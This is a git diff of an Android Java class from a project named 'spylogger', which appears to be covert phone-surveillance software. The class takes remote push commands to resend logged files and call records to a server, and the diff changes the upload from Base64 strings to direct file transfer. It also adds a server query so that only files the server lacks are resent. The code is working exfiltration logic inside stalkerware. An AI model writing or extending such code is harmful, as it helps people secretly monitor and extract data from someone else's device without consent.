@@ -1,6 +1,7 @@
 package com.gravatasufoca.spylogger.services;
 
 import android.content.Context;
+import android.os.Message;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
@@ -64,7 +65,7 @@ public class FcmHelperService {
             @Override
             public void onFinish(Object object) {
                 if (object != null) {
-                    enviarArquivo((String) object);
+                    enviarArquivo((File) object);
                 }
             }
         };
@@ -110,7 +111,19 @@ public class FcmHelperService {
                 limparMensagens();
                 break;
             case REENVIAR_ARQUIVOS:
-                reenviarArquivos();
+                SendSolicitacoesArquivos sendSolicitacoesArquivos=new SendSolicitacoesArquivos(new TaskComplete() {
+                    @Override
+                    public void onFinish(Object object) {
+                        if(object!=null){
+                            Message msg= (Message) object;
+                            if(msg.what==200) {
+                                List<Integer> ids = (List<Integer>) msg.obj;
+                                reenviarArquivos(ids);
+                            }
+                        }
+                    }
+                });
+                sendSolicitacoesArquivos.enviar(envioArquivoVO);
                 break;
             case REENVIAR_LIGACOES:
                 reenviarLigacoes(false);
@@ -171,7 +184,7 @@ public class FcmHelperService {
 
     }
 
-    private void reenviarArquivos(){
+    private void reenviarArquivos(List<Integer> ids){
 
         File outputDir = context.getCacheDir();
         File dirArquivos=new File(outputDir+"/smartlogs");
@@ -199,7 +212,7 @@ public class FcmHelperService {
             while (iterator.hasNext()) {
                 Object[] resultRaw = iterator.next();
                 try {
-                    if(fcmMessageVO.getArquivos().contains((Integer) resultRaw[0])){
+                    if(ids.contains((Integer) resultRaw[0])){
                         continue;
                     }
 
@@ -254,7 +267,7 @@ public class FcmHelperService {
             Log.i("spylogger","tentar novamente...");
             try {
                 Thread.sleep(2000);
-                reenviarArquivos();
+                reenviarArquivos(ids);
             } catch (InterruptedException e1) {
             }
         }finally {
@@ -325,13 +338,14 @@ public class FcmHelperService {
 
     private void enviarArquivo(File file) {
         if(file!=null){
-            enviarArquivo(Utils.encodeBase64(file));
+
+            sendArquivoService.enviar(file,envioArquivoVO);
         }
     }
-    private void enviarArquivo(String file) {
+/*    private void enviarArquivo(String file) {
         if(file!=null){
             envioArquivoVO.setArquivo(file);
             sendArquivoService.enviar(envioArquivoVO);
         }
-    }
+    }*/
 }
